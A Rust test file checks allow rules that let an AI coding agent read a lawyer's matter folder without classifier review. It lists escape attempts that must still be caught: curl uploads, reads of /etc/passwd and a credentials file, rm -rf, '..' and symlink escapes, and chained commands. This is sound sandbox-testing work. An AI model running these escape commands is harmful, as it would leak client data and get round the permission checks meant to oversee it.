//! The matter folder's allow rules on macOS and Linux (`own_allow.rs`' `matter_shell_allow_rules`),
//! through the port of Claude Code 2.1.293's matcher, a model of how it puts a command's parts
//! together ([`super::verdict`]'s) and of its path check for the commands the rules name
//! ([`mac_verdict`]): every rule loads and names a command whose paths Claude Code checks;
//! reading the matter, alone, piped to `head` or `tail` or beside the own notes, is allowed; an
//! outside path, a sibling, a write, a redirection, `rm`, `curl` and `python3 -c` still go to a
//! classifier; and every deny still wins. Unix paths here; Windows' are in
//! `matter_allow_windows_tests.rs`.

use std::path::{Component, Path, PathBuf};

use super::super::super::cross_tests::Rules;
use super::super::super::tests::parse;
use super::super::{MATTER_BASH, PIPE_TAILS, matter_shell_allow_rules};
use super::binary::PATH_CHECKED_BASH;
use super::{LAPTOP_MATTER, LAPTOP_RUN, Verdict, parts};
use crate::agent::data_fence::big_folder::laptop;
use crate::agent::data_fence::launch_tests::covers;
use crate::agent::data_fence::{LaunchDeny, claude_allow_rules_on, claude_deny_rules_on};
use crate::pipeline::tests::support::TempDir;

/// The matter's folder name: a space and parentheses, as lawyers name them.
const MATTER: &str = "Smith v Jones (2024)";

/// A macOS-shaped launch over a laptop-like data folder under a root: the matter at
/// `<root>/Matters/<MATTER>`, stored through a link (`<root>/Clients`), a stand-in protected
/// folder in it (`priv`, denied by an extra `Read` rule), a link out of it (`link-out`), and a
/// folder outside every working folder (`<root>/outside`).
struct Mac {
    deny: LaunchDeny,
    deny_rules: Vec<String>,
    allow_rules: Vec<String>,
    allow: Rules,
    /// The matter's real path, then as stored.
    matter: String,
    stored: String,
    notes: String,
    work: String,
    data: String,
    outside: String,
    root: PathBuf,
}

/// The launch of [`Mac`] under `root`.
fn mac(root: &Path) -> Mac {
    let (mut deny, _, _) = laptop(root, 1, 60, "clauseo-lawyer");
    let real = root.join("Matters").join(MATTER);
    let outside = root.join("outside");
    for file in [
        "memo.txt",
        "sub/n.md",
        "priv/s.txt",
        "du Plessis/memo--final.txt",
    ] {
        let path = real.join(file);
        crate::write::create_dir_all(path.parent().unwrap()).unwrap();
        crate::write::write_file(&path, b"memo line\n").unwrap();
    }
    for sibling in [format!("{MATTER} appeal"), format!("{MATTER}2")] {
        let path = root.join("Matters").join(sibling).join("x.txt");
        crate::write::create_dir_all(path.parent().unwrap()).unwrap();
        crate::write::write_file(&path, b"other client\n").unwrap();
    }
    crate::write::create_dir_all(&outside).unwrap();
    crate::write::write_file(&outside.join("secret.txt"), b"outside secret\n").unwrap();
    crate::write::symlink(&outside, &real.join("link-out")).unwrap();
    crate::write::symlink(&outside.join("secret.txt"), &real.join("link-file")).unwrap();
    crate::write::symlink(&root.join("Matters"), &root.join("Clients")).unwrap();
    let real = dunce::canonicalize(&real).unwrap();
    let stored = root.join("Clients").join(MATTER);
    deny.matter = vec![real.clone(), stored.clone()];
    let text = |path: &Path| path.to_str().unwrap().to_owned();
    let data = text(&deny.spellings[0]);
    let mut deny_rules = claude_deny_rules_on(&deny, false);
    let real_rule = crate::agent::data_fence::rule_path(&text(&real), false);
    deny_rules.push(format!("Read({real_rule}/priv/**)"));
    let allow_rules = claude_allow_rules_on(&deny, false);
    Mac {
        allow: Rules::new(&allow_rules),
        deny_rules,
        allow_rules,
        matter: text(&real),
        stored: text(&stored),
        notes: format!("{data}/agent-state/{LAPTOP_MATTER}/notes"),
        work: format!("{data}/run/{LAPTOP_RUN}/work"),
        outside: text(&outside),
        data,
        deny,
        root: root.to_owned(),
    }
}

/// `part`'s words as Bash splits them: at spaces outside quotes, the quotes dropped, and a
/// `\` outside them taken as escaping the next character.
fn words(part: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut word: Option<String> = None;
    let mut quote = None;
    let mut chars = part.chars();
    while let Some(c) = chars.next() {
        match (quote, c) {
            (Some(open), _) if c == open => quote = None,
            (None, '\\') => word.get_or_insert_with(String::new).extend(chars.next()),
            (None, '"' | '\'') => {
                quote = Some(c);
                word.get_or_insert_with(String::new);
            }
            (None, ' ' | '\t') => out.extend(word.take()),
            _ => word.get_or_insert_with(String::new).push(c),
        }
    }
    out.extend(word);
    out
}

/// The paths Claude Code checks in `part` (`D9`): for [`MATTER_BASH`]' commands each argument
/// from the first that is not a flag on (`Nu`), `.` for a bare `ls`; none for other commands.
fn checked_paths(part: &str) -> Vec<String> {
    let words = words(part);
    let Some((command, args)) = words.split_first() else {
        return Vec::new();
    };
    if !MATTER_BASH.contains(&command.as_str()) {
        return Vec::new();
    }
    let mut out = Vec::new();
    let (mut rest, mut seen) = (false, false);
    for arg in args {
        if rest || seen {
            out.push(arg.clone());
        } else if arg == "--" {
            rest = true;
        } else if arg == "-" || !arg.starts_with('-') {
            out.push(arg.clone());
            seen = true;
        }
    }
    if out.is_empty() && command == "ls" {
        out.push(".".to_owned());
    }
    out
}

/// `path` made absolute against `cwd` (`~` is a home outside every working folder), its `.`
/// and `..` steps taken by name, and each existing link resolved, as Claude Code's check does.
fn resolved(cwd: &str, path: &str) -> PathBuf {
    let joined = match path.strip_prefix('~') {
        Some(rest) => PathBuf::from(format!("/home-elsewhere{rest}")),
        None => Path::new(cwd).join(path),
    };
    let mut out = PathBuf::new();
    for part in joined.components() {
        match part {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            Component::Prefix(_) | Component::RootDir | Component::Normal(_) => out.push(part),
        }
        if let Ok(real) = dunce::canonicalize(&out) {
            out = real;
        }
    }
    out
}

/// What Claude Code does with Bash `command` in a [`Mac`] launch (the matter its working
/// folder, the work and notes folders added): denied when a part's checked path is in a
/// `Read` deny; allowed when an allow rule matches every part and each checked path is inside
/// a working folder; else a classifier decides (too complex, a redirection, no rule, a path
/// outside).
fn mac_verdict(mac: &Mac, command: &str) -> Verdict {
    let split = parts("Bash", command);
    let denies: Vec<&str> = mac
        .deny_rules
        .iter()
        .filter_map(|rule| rule.strip_prefix("Read(//")?.strip_suffix(')'))
        .collect();
    let paths = |part: &String| -> Vec<PathBuf> {
        let cwd = mac.matter.as_str();
        checked_paths(part)
            .iter()
            .map(|p| resolved(cwd, p))
            .collect()
    };
    for part in split.iter().flatten() {
        for path in paths(part) {
            let text = path.to_str().unwrap().trim_start_matches('/');
            if denies.iter().any(|target| covers(target, text)) {
                return Verdict::Denied;
            }
        }
    }
    let working = [&mac.matter, &mac.notes, &mac.work].map(PathBuf::from);
    let inside = |path: &PathBuf| working.iter().any(|dir| path.starts_with(dir));
    match split {
        Some(parts)
            if parts
                .iter()
                .all(|part| mac.allow.denies("Bash", part) && paths(part).iter().all(inside)) =>
        {
            Verdict::Allowed
        }
        _ => Verdict::Classifier,
    }
}

/// The matter's reads Claude writes, in both spellings: alone, piped to `head` or `tail`, and
/// beside the own notes and work folders.
fn reads(mac: &Mac) -> Vec<String> {
    let (n, w) = (&mac.notes, &mac.work);
    let mut out = Vec::new();
    for m in [&mac.matter, &mac.stored] {
        for path in [
            m.clone(),
            format!("{m}/"),
            format!("{m}/sub"),
            format!("{m}/memo.txt"),
        ] {
            for quote in ["\"", "'"] {
                let path = format!("{quote}{path}{quote}");
                for command in ["ls", "ls -la", "cat", "head -n 5", "tail -n 3", "tail"] {
                    out.push(format!("{command} {path}"));
                }
            }
        }
        out.extend([
            format!(r#"cat "{m}/du Plessis/memo--final.txt""#),
            format!(r#"ls -la "{m}/du Plessis" | head -n 2"#),
            format!(r#"tail -n 1 "{m}/du Plessis/memo--final.txt""#),
            format!(r#"ls "{m}" | head"#),
            format!(r#"ls -la "{m}/sub" | head -5"#),
            format!(r#"cat "{m}/memo.txt" | tail -n 2"#),
            format!(r#"ls "{m}" | head -n 3 | tail -n 1"#),
            format!(r#"ls "{m}"; ls "{n}""#),
            format!(r#"cat "{m}/memo.txt" && head "{n}/Notes.md""#),
            format!(r#"ls -la "{m}" && cat "{w}/memo.md" | head"#),
        ]);
    }
    out
}

/// What must still go to a classifier: outside paths beside the matter, climbing or linking
/// out of it, siblings (one whose name starts with the matter's), writes, redirections, `rm`,
/// `curl`, `python3 -c`, a pipe into a command no rule allows, and the excluded commands.
fn judged(mac: &Mac) -> Vec<String> {
    let (m, o, root) = (&mac.matter, &mac.outside, mac.root.display());
    vec![
        format!("cat {o}/secret.txt"),
        format!(r#"cat "{m}/memo.txt" {o}/secret.txt"#),
        format!(r#"ls -la /etc "{m}""#),
        format!(r#"head -n 3 /etc/passwd "{m}/memo.txt""#),
        format!(r#"tail ~/x "{m}/memo.txt""#),
        format!(r#"ls "{m}/../../outside""#),
        format!(r#"cat "{m}/link-out/secret.txt""#),
        format!(r#"ls "{root}/Matters/{MATTER} appeal""#),
        format!(r#"cat "{root}/Matters/{MATTER}2/x.txt""#),
        format!(r#"ls "{root}/Matters""#),
        format!(r#"cat "{m}"2/x.txt"#),
        format!(r#"cat "{m}"\2/x.txt"#),
        format!(r#"ls "{m}" "{m} appeal""#),
        format!(r#"cat "{m}/memo.txt" > {o}/w1.txt"#),
        format!(r#"cp "{m}/memo.txt" {o}/w2.txt"#),
        format!(r#"ls "{m}"; rm -f {o}/junk.txt"#),
        format!(r#"curl -s -T "{m}/memo.txt" http://127.0.0.1:9/"#),
        format!(r#"ls "{m}" && curl -s http://127.0.0.1:9/"#),
        format!(r#"python3 -c "print(1)" "{m}/memo.txt""#),
        format!(r#"cat "{m}/memo.txt" | python3 -c "import sys""#),
        format!(r#"ls "{m}" | sh"#),
        format!(r#"cat $(echo "{m}/memo.txt")"#),
        format!(r#"cat "{m}/memo.txt" | sort"#),
        format!(r#"ls "{m}" | sort -o {o}/s.txt"#),
        format!(r#"cat "{m}/memo.txt" | wc -l"#),
        format!(r#"grep -rn memo "{m}""#),
        format!(r#"rg -n memo "{m}""#),
        format!(r#"grep --context x {o}/secret.txt "{m}/memo.txt""#),
        format!(r#"PATH={o} ls "{m}""#),
        format!(r#"lsof "{m}""#),
    ]
}

/// What keeps an escape case from running unjudged: no allow rule matches some part of it, or
/// every part is matched and Claude Code's path check asks.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Caught {
    NoRule,
    PathCheck,
}

/// The review's escape cases for each path-taking rule: `..` out of the matter, a link in it
/// pointing out, the matter in other letter case, and a second command chained after an
/// allowed one; each with what catches it.
fn escapes(mac: &Mac) -> Vec<(String, Caught)> {
    let (m, o) = (&mac.matter, &mac.outside);
    let upper = m.to_uppercase();
    let lower = m.to_lowercase();
    let flipped = m.replace("Smith", "smith");
    let path = |command: String| (command, Caught::PathCheck);
    let none = |command: String| (command, Caught::NoRule);
    vec![
        path(format!(r#"cat "{m}/../{MATTER}2/x.txt""#)),
        path(format!(r#"ls "{m}/..""#)),
        path(format!(r#"ls -la "{m}/../..""#)),
        path(format!(r#"cat "{m}/sub/../../{MATTER} appeal/x.txt""#)),
        path(format!(r#"head "{m}/../../outside/secret.txt""#)),
        path(format!(r#"cat "{m}/link-out/secret.txt""#)),
        path(format!(r#"ls "{m}/link-out""#)),
        path(format!(r#"cat "{m}/link-file""#)),
        path(format!(r#"tail -n 1 "{m}/link-file""#)),
        none(format!(r#"ls "{upper}""#)),
        none(format!(r#"cat "{lower}/memo.txt""#)),
        none(format!(r#"cat "{flipped}/memo.txt""#)),
        none(format!(r#"ls "{m}"; curl -s http://127.0.0.1:9/"#)),
        none(format!(r#"cat "{m}/memo.txt" && rm -f {o}/junk.txt"#)),
        none(format!(
            r#"cat "{m}/memo.txt" | python3 -c "import sys; sys.stdin.read()""#
        )),
        none(format!("ls \"{m}\"\ncurl -s http://127.0.0.1:9/")),
        none(format!(r#"ls "{m}" || python3 -c "print(1)""#)),
        none(format!(
            r#"head "{m}/memo.txt" & curl -s http://127.0.0.1:9/"#
        )),
    ]
}

/// Writes into the matter itself (port only: a probe never writes where it reads).
fn matter_writes(mac: &Mac) -> Vec<String> {
    let m = &mac.matter;
    vec![
        format!(r#"cat "{m}/memo.txt" > "{m}/copy.txt""#),
        format!(r#"cat "{m}/memo.txt" >> "{m}/memo.txt""#),
        format!(r#"cp "{m}/memo.txt" "{m}/copy.txt""#),
        format!(r#"rm -f "{m}/memo.txt""#),
        format!(r#"rm -rf "{m}""#),
        format!(r#"ls "{m}" && rm -rf "{m}/sub""#),
        format!(r#"tail -n 1 "{m}/memo.txt" | tee "{m}/t.txt""#),
        format!(r#"head "{m}/memo.txt"; touch "{m}/new.txt""#),
        format!(r#"mv "{m}/memo.txt" "{m}/old.txt""#),
        format!(r#"cat "{m}/memo.txt" | sort -o "{m}/memo.txt""#),
    ]
}

/// Reads of a protected place inside the matter or in `<data>`, alone or beside the matter.
fn protected(mac: &Mac) -> Vec<String> {
    let (m, d) = (&mac.matter, &mac.data);
    vec![
        format!(r#"cat "{m}/priv/s.txt""#),
        format!(r#"ls "{m}" "{m}/priv/s.txt""#),
        format!(r#"cat "{m}/memo.txt" "{d}/logs/host.log""#),
        format!(r#"head "{d}/agents/claude-acp/home/.credentials.json""#),
        format!(r#"ls "{m}"; cat "{d}/logs/host.log""#),
        format!(r#"cat "{m}/../../data/logs/host.log""#),
    ]
}

/// Every matter rule loads as Claude Code reads it, ends in no odd backslash run and starts
/// with a command whose paths Claude Code checks (`W_r`); a pipe tail is the command and ` *`.
/// None before the launch has the matter, and only the pipe tails when the matter holds
/// `<data>`. And the growth.
#[test]
fn every_matter_rule_loads_and_names_a_path_checked_command() {
    assert!(MATTER_BASH.iter().all(|c| PATH_CHECKED_BASH.contains(c)));
    assert!(PIPE_TAILS.iter().all(|c| MATTER_BASH.contains(c)));
    let dir = TempDir::new("matter-allow-load");
    let mac = mac(dir.path());
    let rules = matter_shell_allow_rules(&mac.deny, false);
    for rule in &rules {
        let (tool, content) = parse(rule).unwrap_or_else(|why| panic!("{why}: {rule}"));
        assert_eq!(tool, "Bash", "{rule}");
        assert!(!content.ends_with(":*"), "{rule}");
        let raw = rule.get(5..rule.len() - 1).unwrap();
        assert!(
            (raw.len() - raw.trim_end_matches('\\').len()) % 2 == 0,
            "{rule}"
        );
        let command = content.split(' ').next().unwrap();
        assert!(MATTER_BASH.contains(&command), "{rule}");
        let tail = PIPE_TAILS.iter().any(|c| content == format!("{c} *"));
        assert!(tail || content.contains(&mac.matter) || content.contains(&mac.stored));
    }
    assert!(rules.iter().all(|rule| mac.allow_rules.contains(rule)));
    let none = LaunchDeny {
        matter: Vec::new(),
        ..mac.deny.clone()
    };
    assert_eq!(matter_shell_allow_rules(&none, false), Vec::<String>::new());
    let holding = LaunchDeny {
        matter: vec![mac.root.clone()],
        ..mac.deny.clone()
    };
    let tails: Vec<String> = PIPE_TAILS.iter().map(|c| format!("Bash({c} *)")).collect();
    assert_eq!(matter_shell_allow_rules(&holding, false), tails);
    let size = |rules: &[String]| serde_json::to_string(rules).unwrap().len();
    let before = claude_allow_rules_on(&none, false);
    eprintln!(
        "off Windows: {} allow rules before, {} after (+{}: {} per matter spelling and {} pipe \
         tails), {} B before, +{} B",
        before.len(),
        mac.allow_rules.len(),
        rules.len(),
        MATTER_BASH.len() * 5,
        PIPE_TAILS.len(),
        size(&before),
        size(&mac.allow_rules) - size(&before)
    );
    assert_eq!(rules.len(), 2 * MATTER_BASH.len() * 5 + PIPE_TAILS.len());
}

/// Reading the matter in either spelling, with flags and quotes, alone, piped to `head` or
/// `tail`, or beside the own notes and work folders, is allowed: no classifier sees it.
#[test]
fn reading_the_matter_skips_the_classifiers() {
    let dir = TempDir::new("matter-allow-reads");
    let mac = mac(dir.path());
    let reads = reads(&mac);
    assert!(reads.len() > 100, "{}", reads.len());
    for command in &reads {
        assert_eq!(mac_verdict(&mac, command), Verdict::Allowed, "{command}");
    }
}

/// An outside path, a link or climb out, a sibling, a write, a redirection, `rm`, `curl`,
/// `python3 -c`, a pipe into anything but `head` or `tail`, `grep`, `rg`, an environment prefix
/// or another command still goes to a classifier; no allow rule decides them.
#[test]
fn outside_paths_siblings_and_writes_still_go_to_a_classifier() {
    let dir = TempDir::new("matter-allow-judged");
    let mac = mac(dir.path());
    for command in judged(&mac).into_iter().chain(matter_writes(&mac)) {
        assert_eq!(
            mac_verdict(&mac, &command),
            Verdict::Classifier,
            "{command}"
        );
    }
}

/// Each escape case is caught as [`escapes`] says: with no rule for some part, or with a rule
/// for every part and Claude Code's path check asking (the `..` and link cases resolve
/// outside the working folders). Either way a classifier decides.
#[test]
fn escapes_out_of_the_matter_are_caught_by_no_rule_or_the_path_check() {
    let dir = TempDir::new("matter-allow-escapes");
    let mac = mac(dir.path());
    for (command, caught) in escapes(&mac) {
        let split = parts("Bash", &command).unwrap_or_default();
        let ruled = !split.is_empty() && split.iter().all(|part| mac.allow.denies("Bash", part));
        let want = caught == Caught::PathCheck;
        assert_eq!(ruled, want, "{caught:?}: {command}");
        assert_eq!(
            mac_verdict(&mac, &command),
            Verdict::Classifier,
            "{command}"
        );
    }
}

/// A protected place inside the matter (a stand-in `Read` deny) or in `<data>` stays denied,
/// alone, beside the matter, in a compound line, and climbed into from the matter.
#[test]
fn every_deny_still_wins_beside_the_matter() {
    let dir = TempDir::new("matter-allow-deny");
    let mac = mac(dir.path());
    for command in protected(&mac) {
        assert_eq!(mac_verdict(&mac, &command), Verdict::Denied, "{command}");
    }
}

#[path = "matter_allow_probe_tests.rs"]
mod probe;
